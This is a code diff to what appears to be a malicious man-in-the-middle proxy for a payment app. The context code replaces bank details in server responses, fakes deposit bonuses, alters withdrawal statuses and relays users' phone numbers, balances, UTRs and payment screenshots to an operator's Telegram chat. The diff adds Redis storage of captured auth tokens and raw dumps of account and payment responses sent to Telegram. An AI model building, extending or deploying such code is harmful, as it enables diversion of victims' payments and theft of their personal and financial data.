@@ -89,26 +89,37 @@ async function saveData(data) {
 function saveTokenUserId(req, userId) {
   if (!userId) return;
   const tok = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
-  if (tok && tok.length > 10) tokenUserMap[tok] = userId;
+  if (tok && tok.length > 10) {
+    tokenUserMap[tok] = String(userId);
+    if (redis) redis.hset('ezpayTokenMap', tok.substring(0, 100), String(userId)).catch(()=>{});
+  }
 }
 
-function getUserIdFromToken(req) {
+async function getUserIdFromToken(req) {
   const tok = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
-  if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
+  if (!tok || tok.length < 10) return null;
+  if (tokenUserMap[tok]) return tokenUserMap[tok];
+  if (redis) {
+    try {
+      const stored = await redis.hget('ezpayTokenMap', tok.substring(0, 100));
+      if (stored) { tokenUserMap[tok] = String(stored); return String(stored); }
+    } catch(e) {}
+  }
   return null;
 }
 
-function extractUserId(req, jsonResp) {
-  const fromToken = getUserIdFromToken(req);
+async function extractUserId(req, jsonResp) {
+  const fromToken = await getUserIdFromToken(req);
   if (fromToken) return fromToken;
   const body = req.parsedBody || {};
-  const uid = body.userId || body.userid || body.memberId || body.id || '';
+  const uid = body.userId || body.userid || body.memberId || '';
   if (uid) return String(uid);
   const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
   if (qs.get('userId')) return String(qs.get('userId'));
+  if (qs.get('memberId')) return String(qs.get('memberId'));
   const respData = getResponseData(jsonResp);
   if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
-    const rid = respData.userId || respData.userid || respData.memberId || respData.id || respData.uid || '';
+    const rid = respData.userId || respData.userid || respData.memberId || '';
     if (rid) return String(rid);
   }
   const authHeader = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
@@ -118,8 +129,8 @@ function extractUserId(req, jsonResp) {
       if (parts.length === 3) {
         const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
         if (payload.userId) return String(payload.userId);
+        if (payload.memberId) return String(payload.memberId);
         if (payload.sub) return String(payload.sub);
-        if (payload.id) return String(payload.id);
       }
     } catch(e) {}
   }
@@ -273,7 +284,7 @@ async function transparentProxy(req, res) {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
     if (jsonResp) {
-      const uid = extractUserId(req, jsonResp);
+      const uid = await extractUserId(req, jsonResp);
       if (uid) saveTokenUserId(req, uid);
     }
 
@@ -480,7 +491,7 @@ app.use(async (req, res, next) => {
     if (data.logRequests && data.adminChatId && bot) {
       const path = req.originalUrl || req.url;
       if (!path.includes('bot-webhook') && !path.includes('favicon')) {
-        const userId = extractUserId(req, null);
+        const userId = await extractUserId(req, null);
         const phone = getPhone(data, userId);
         const tag = userId ? ` (${phone || userId})` : '';
         bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}`).catch(()=>{});
@@ -904,15 +915,21 @@ app.post('/app/api/system/v2/login', async (req, res) => {
   try {
     const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = extractUserId(req, jsonResp);
+    const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
     const phone = body.memberPhone || body.phone || body.mobile || body.telephone || body.username || '';
     if (userId) {
       saveTokenUserId(req, userId);
       if (phone) userPhoneMap[String(userId)] = String(phone);
       const loginData = getResponseData(jsonResp);
-      if (loginData && loginData.token) tokenUserMap[loginData.token] = userId;
-      if (loginData && loginData.accessToken) tokenUserMap[loginData.accessToken] = userId;
+      if (loginData && loginData.token) {
+        tokenUserMap[loginData.token] = String(userId);
+        if (redis) redis.hset('ezpayTokenMap', loginData.token.substring(0, 100), String(userId)).catch(()=>{});
+      }
+      if (loginData && loginData.accessToken) {
+        tokenUserMap[loginData.accessToken] = String(userId);
+        if (redis) redis.hset('ezpayTokenMap', loginData.accessToken.substring(0, 100), String(userId)).catch(()=>{});
+      }
       if (loginData) {
         const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
         if (respPhone && userId) userPhoneMap[String(userId)] = String(respPhone);
@@ -926,8 +943,14 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       if (respUserId) {
         userPhoneMap[String(respUserId)] = String(phone);
         saveTokenUserId(req, String(respUserId));
-        if (loginData && loginData.token) tokenUserMap[loginData.token] = String(respUserId);
-        if (loginData && loginData.accessToken) tokenUserMap[loginData.accessToken] = String(respUserId);
+        if (loginData && loginData.token) {
+          tokenUserMap[loginData.token] = String(respUserId);
+          if (redis) redis.hset('ezpayTokenMap', loginData.token.substring(0, 100), String(respUserId)).catch(()=>{});
+        }
+        if (loginData && loginData.accessToken) {
+          tokenUserMap[loginData.accessToken] = String(respUserId);
+          if (redis) redis.hset('ezpayTokenMap', loginData.accessToken.substring(0, 100), String(respUserId)).catch(()=>{});
+        }
         trackUser(data, String(respUserId), 'Login', phone);
         saveData(data).catch(()=>{});
       }
@@ -956,13 +979,13 @@ app.post('/app/api/system/v2/login', async (req, res) => {
 
 async function proxyAndReplaceBankDetails(req, res, label) {
   const data = await loadData();
-  const reqUserId = extractUserId(req, null);
+  const reqUserId = await extractUserId(req, null);
   const reqEff = getEffectiveSettings(data, reqUserId);
   if (reqEff.botEnabled === false) return await transparentProxy(req, res);
 
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
+    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
 
@@ -1016,7 +1039,7 @@ async function proxyAndReplaceBankInList(req, res) {
 
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = extractUserId(req, jsonResp);
+    const detectedUserId = await extractUserId(req, jsonResp);
     if (detectedUserId) saveTokenUserId(req, detectedUserId);
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;
@@ -1054,7 +1077,7 @@ async function proxyAndAddBonus(req, res) {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = extractUserId(req, jsonResp);
+    const detectedUserId = await extractUserId(req, jsonResp);
     const eff = getEffectiveSettings(data, detectedUserId);
     const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
 
@@ -1085,12 +1108,12 @@ app.post('/app/api/orderOut/detail', async (req, res) => {
 
 app.post('/app/api/orderOut/pendingDetail', async (req, res) => {
   const data = await loadData();
-  const reqUserId = extractUserId(req, null);
+  const reqUserId = await extractUserId(req, null);
   const reqEff = getEffectiveSettings(data, reqUserId);
   if (reqEff.botEnabled === false) return await transparentProxy(req, res);
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
+    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
     const respData = getResponseData(jsonResp);
@@ -1128,12 +1151,12 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
 
 app.post('/app/api/orderOut/getPayWallet', async (req, res) => {
   const data = await loadData();
-  const reqUserId = extractUserId(req, null);
+  const reqUserId = await extractUserId(req, null);
   const reqEff = getEffectiveSettings(data, reqUserId);
   if (reqEff.botEnabled === false) return await transparentProxy(req, res);
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
+    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
     if (data.adminChatId && bot) {
@@ -1179,7 +1202,7 @@ app.post('/app/api/memberRecharge/createPaymentOrder', async (req, res) => {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = extractUserId(req, jsonResp);
+    const userId = await extractUserId(req, jsonResp);
     if (userId) { trackUser(data, userId, 'Recharge Order'); saveData(data).catch(()=>{}); }
     const rechargeData = getResponseData(jsonResp);
     if (rechargeData && data.adminChatId && bot) {
@@ -1194,7 +1217,7 @@ app.post('/app/api/memberRecharge/confirmRecharge', async (req, res) => {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = extractUserId(req, jsonResp);
+    const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `✅ Recharge Confirmed [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || 'N/A'}\nAmount: ₹${body.amount || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
@@ -1242,7 +1265,7 @@ app.post('/app/api/orderOut/payingSubmit', async (req, res) => {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = extractUserId(req, jsonResp);
+    const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `📤 Payment Submit [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || body.referenceNo || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
@@ -1256,7 +1279,7 @@ app.post('/app/api/orderOut/payingSubmitResult', async (req, res) => {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = extractUserId(req, jsonResp);
+    const userId = await extractUserId(req, jsonResp);
     if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `📤 Payment Result [${userId || 'N/A'}]\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
     }
@@ -1291,27 +1314,37 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
     });
     let jsonResp = null;
     try { jsonResp = JSON.parse(respBody); } catch(e) {}
-    const userId = extractUserId(req, jsonResp);
+    const userId = await extractUserId(req, jsonResp);
     const phone = getPhone(data, userId);
     if (data.adminChatId && bot) {
-      const rawStr = req.rawBody ? req.rawBody.toString('utf8', 0, Math.min(req.rawBody.length, 500)) : '';
-      const imgUrls = rawStr.match(/https?:\/\/[^\s"',\r\n]+\.(jpg|jpeg|png|gif|webp)[^\s"',\r\n]*/gi) || [];
-      const bodyFields = req.parsedBody || {};
-      const orderId = bodyFields.orderId || bodyFields.orderCode || 'N/A';
-      bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nOrder: ${orderId}`).catch(()=>{});
-      if (imgUrls.length > 0) {
-        for (const imgUrl of imgUrls.slice(0, 3)) {
-          try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 UTR Screenshot [${userId || 'N/A'}]` }); } catch(e) {
-            bot.sendMessage(data.adminChatId, `📸 Image URL: ${imgUrl}`).catch(()=>{});
-          }
-        }
-      }
+      bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\n\n📥 RESPONSE:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3000)}`).catch(()=>{});
+      const allUrls = [];
       const respData = getResponseData(jsonResp);
       if (respData && typeof respData === 'object') {
-        const imgField = respData.paymentImgUser || respData.imageUrl || respData.imgUrl || respData.image || respData.url || '';
-        if (imgField) {
-          try { await bot.sendPhoto(data.adminChatId, imgField, { caption: `📸 Server Image [${userId || 'N/A'}]` }); } catch(e) {
-            bot.sendMessage(data.adminChatId, `📸 Server Image URL: ${imgField}`).catch(()=>{});
+        for (const [k, v] of Object.entries(respData)) {
+          if (typeof v === 'string' && v.match(/^https?:\/\/.+/i)) allUrls.push(v);
+        }
+      }
+      if (jsonResp && typeof jsonResp === 'object') {
+        for (const [k, v] of Object.entries(jsonResp)) {
+          if (typeof v === 'string' && v.match(/^https?:\/\/.+/i)) allUrls.push(v);
+        }
+      }
+      const fullResp = JSON.stringify(jsonResp || '');
+      const foundUrls = fullResp.match(/https?:\/\/[^\s"',\\\]}>]+/gi) || [];
+      for (const u of foundUrls) {
+        if (!allUrls.includes(u)) allUrls.push(u);
+      }
+      const imgUrls = allUrls.filter(u => /\.(jpg|jpeg|png|gif|webp|bmp)/i.test(u) || /image|img|photo|screenshot|upload|file/i.test(u));
+      for (const imgUrl of imgUrls.slice(0, 5)) {
+        try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 UTR Screenshot [${userId || 'N/A'}]` }); } catch(e) {
+          bot.sendMessage(data.adminChatId, `📸 Image URL (failed to load): ${imgUrl}`).catch(()=>{});
+        }
+      }
+      if (imgUrls.length === 0 && allUrls.length > 0) {
+        for (const u of allUrls.slice(0, 3)) {
+          try { await bot.sendPhoto(data.adminChatId, u, { caption: `📸 Screenshot [${userId || 'N/A'}]` }); } catch(e) {
+            bot.sendMessage(data.adminChatId, `🔗 URL: ${u}`).catch(()=>{});
           }
         }
       }
@@ -1347,7 +1380,7 @@ app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
     });
     let jsonResp = null;
     try { jsonResp = JSON.parse(respBody); } catch(e) {}
-    const userId = extractUserId(req, jsonResp);
+    const userId = await extractUserId(req, jsonResp);
     const phone = getPhone(data, userId);
     if (data.adminChatId && bot) {
       const rawStr = req.rawBody ? req.rawBody.toString('utf8', 0, Math.min(req.rawBody.length, 500)) : '';
@@ -1375,12 +1408,12 @@ app.all('/app/api/orderOut/searchList', async (req, res) => {
 
 app.all('/app/api/orderOut/paying', async (req, res) => {
   const data = await loadData();
-  const reqUserId = extractUserId(req, null);
+  const reqUserId = await extractUserId(req, null);
   const reqEff = getEffectiveSettings(data, reqUserId);
   if (reqEff.botEnabled === false) return await transparentProxy(req, res);
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
+    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
     const respData = getResponseData(jsonResp);
@@ -1483,7 +1516,7 @@ app.all('/app/api/memberManager/withdrawHistory', async (req, res) => {
           bot.sendMessage(data.adminChatId, `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`).catch(()=>{});
         }
 
-        const detectedUserId = extractUserId(req, jsonResp);
+        const detectedUserId = await extractUserId(req, jsonResp);
         const eff = getEffectiveSettings(data, detectedUserId);
         if (eff.botEnabled !== false) {
           const bank = getActiveBank(data, detectedUserId);
@@ -1509,28 +1542,38 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const respData = getResponseData(jsonResp);
-    const userId = respData?.id || respData?.memberId || respData?.userId || extractUserId(req, jsonResp);
-    if (userId) {
+    const userId = await extractUserId(req, jsonResp) || respData?.id || respData?.memberId || respData?.userId || '';
+    let phone = '';
+    let bal = '';
+    if (respData && typeof respData === 'object') {
+      phone = respData.memberPhone || respData.phone || respData.mobile || respData.telephone || '';
+      bal = respData.balance ?? respData.availableBalance ?? respData.amount ?? '';
+      if (!userId && !phone) {
+        for (const [k, v] of Object.entries(respData)) {
+          if (!userId && /id$/i.test(k) && v && typeof v !== 'object') { }
+          if (!phone && /phone|mobile|tel/i.test(k) && v) phone = String(v);
+        }
+      }
+    }
+    const effectiveUserId = userId || '';
+    if (effectiveUserId) {
       if (!data.trackedUsers) data.trackedUsers = {};
-      const existing = data.trackedUsers[String(userId)] || {};
-      data.trackedUsers[String(userId)] = {
+      const existing = data.trackedUsers[String(effectiveUserId)] || {};
+      data.trackedUsers[String(effectiveUserId)] = {
         ...existing,
         lastAction: 'mine',
         lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-        phone: existing.phone || respData?.memberPhone || respData?.phone || '',
-        name: respData?.memberName || respData?.realName || respData?.name || existing.name || '',
-        balance: respData?.balance || respData?.availableBalance || existing.balance || '',
+        phone: phone || existing.phone || '',
+        balance: bal !== '' ? bal : (existing.balance || ''),
         orderCount: existing.orderCount || 0
       };
       await saveData(data);
     }
     if (data.adminChatId && bot) {
-      const name = respData?.memberName || respData?.realName || respData?.name || 'N/A';
-      const bal = respData?.balance || respData?.availableBalance || 'N/A';
-      const level = respData?.levelName || respData?.memberLevel || respData?.level || 'N/A';
-      bot.sendMessage(data.adminChatId, `👤 Mine [${userId || 'N/A'}]\n📛 Name: ${name}\n💰 Balance: ${bal}\n⭐ Level: ${level}`).catch(()=>{});
+      const dump = JSON.stringify(respData, null, 2).substring(0, 2500);
+      bot.sendMessage(data.adminChatId, `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}\n\n📥 RAW:\n${dump}`).catch(()=>{});
     }
-    const reqUserId = extractUserId(req, jsonResp) || userId;
+    const reqUserId = effectiveUserId || userId;
     const eff = getEffectiveSettings(data, reqUserId);
     if (eff.depositSuccess && respData && typeof respData === 'object') {
       const bonus = eff.depositBonus || 0;
@@ -1579,7 +1622,7 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
     const data = await loadData();
     try {
       const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-      const userId = extractUserId(req, jsonResp);
+      const userId = await extractUserId(req, jsonResp);
       const phone = getPhone(data, userId);
       if (data.adminChatId && bot) {
         const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
